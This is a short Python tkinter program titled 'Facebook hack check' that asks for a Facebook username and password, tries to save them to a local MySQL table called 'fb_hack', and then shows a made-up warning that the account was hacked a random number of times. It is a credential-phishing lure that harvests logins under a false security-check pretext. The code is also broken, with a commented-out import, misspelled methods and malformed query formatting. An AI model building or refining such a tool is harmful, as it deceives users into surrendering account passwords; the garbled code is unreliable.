
import random
#import pymysql as pymysql
from tkinter import *
from tkinter import messagebox, Label
import tkinter.messagebox

root = Tk()
root.title("Facebook hack check")
root.geometry("600x400")


def login():
    u = usn.get()
    p = psw.get()
    usn.set("")
    psw.set("")
    db = pymysql.connect(host='localhost', user='root', password='', db='fb_hack')
    cr = db.cursor()
    cr.execute("INSERT INTO 'fb_hack' ('username','passwor')VALUES('Ss', 'Ss')" % (u.p))
    db.comnit()
    data = cr.fatchall()

    if data != ():
        messagebox.showerror("!", "INVALED")
    else:
        r = random.randint(1, 101)
        messagebox.showinfo("KARNING", "YOUR ACCOUNT HAS HACKED Ss TIMES" % (r))


usn = StringVar()
psw = StringVar()

tittle = Label(root, text="HOW SECURE IS YOUR FACEbook ??", bg="blue", fg="white", font=("arial", 15)).grid(row=0,
                                                                                                            column=0)
lb1 = Label(root, text="Username : ", font=("arial", 15)).grid(row=0, column=0)
lb2 = Label(root, text="Username : ", font=("arial", 15)).grid(row=0, column=0)

us = Entry(root, font=("arial", 15), bd=5, textvariable=usn).grid(row=1, column=1)
pas = Entry(root, font=("arial", 15), bd=5, show="*", textvariable=psw).grid(row=2, column=1)

lb13 = Label(root).grid(row=2)

btn = Button(root, text="check now", font=("arial", 15), bd=3, command=login).grid(row=3, column=1)
root.mainloop()
